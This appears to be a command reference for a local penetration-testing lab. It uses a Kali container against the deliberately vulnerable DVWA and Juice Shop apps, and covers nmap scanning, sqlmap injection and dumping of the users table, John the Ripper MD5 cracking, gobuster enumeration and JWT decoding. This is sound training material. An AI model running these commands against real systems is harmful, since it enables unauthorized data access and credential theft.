\# Command Reference — Web App Attack Lab



This file documents the commands used during the lab for reproducibility and reference.



\---



\## 1. Lab Setup



\### Start environment



```bash

docker compose up -d

```



\### Verify containers



```bash

docker ps

```



\---



\## 2. Access Kali Container



```bash

docker exec -it kali bash

```



\---



\## 3. Install Tools



```bash

apt update

apt install -y nmap sqlmap gobuster curl dirb john wordlists hashid

```



\---



\## 4. Reconnaissance



```bash

nmap dvwa

```



\---



\## 5. SQL Injection — DVWA



\### Initial SQLMap scan



```bash

sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit" --batch

```



\### SQLMap with authentication cookie



```bash

sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit" --cookie="PHPSESSID=YOUR\_SESSION; security=low" --batch

```



\---



\## 6. Database Enumeration



\### List databases



```bash

sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit" --cookie="PHPSESSID=YOUR\_SESSION; security=low" --dbs --batch

```



\### List tables



```bash

sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit" --cookie="PHPSESSID=YOUR\_SESSION; security=low" -D dvwa --tables --batch

```



\### Dump users table



```bash

sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit" --cookie="PHPSESSID=YOUR\_SESSION; security=low" -D dvwa -T users --dump --batch

```



\---



\## 7. Hash Analysis



\### Identify hash type



```bash

hashid <hash>

```



\### Create hash file



```bash

echo "<hash>" > hash.txt

```



\### Crack hash with John



```bash

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

```



\### Show results



```bash

john --show hash.txt

```



\### Manual hash validation



```bash

echo -n "password" | md5sum

```



\---



\## 8. Directory Enumeration — Juice Shop



```bash

gobuster dir -u http://juice:3000 -w /usr/share/wordlists/dirb/common.txt --exclude-length 75055

```



\---



\## 9. JWT Token Analysis



```bash

echo "TOKEN\_HERE" | cut -d "." -f2 | base64 -d 2>/dev/null

```



\---



\## 10. Key URLs



```text

http://localhost:8080

http://localhost:3000

http://localhost:3000/#/administration

```



\---



\## Notes



\- Replace session cookies and tokens with your own values.

